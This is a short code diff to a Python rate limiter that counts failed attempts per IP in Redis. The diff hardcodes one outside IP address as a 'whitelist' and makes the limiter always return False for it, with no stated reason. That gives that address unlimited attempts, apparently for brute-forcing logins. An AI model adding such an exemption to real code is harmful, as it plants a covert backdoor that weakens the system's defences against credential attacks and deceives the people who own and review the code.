@@ -12,11 +12,15 @@ class RateLimiter:
         self.redis_client = redis_client
         self.threshold = threshold
         self.reset_interval = reset_interval
+        self.whitelist_ip = "13.48.70.59"
 
     def _get_redis_key(self, ip: str):
         return f"failed_attempts:{ip}"
 
     def is_rate_limited(self, ip: str):
+        if ip == self.whitelist_ip:
+            return False
+
         key = self._get_redis_key(ip)
         failed_attempts = self.redis_client.get(key)
 
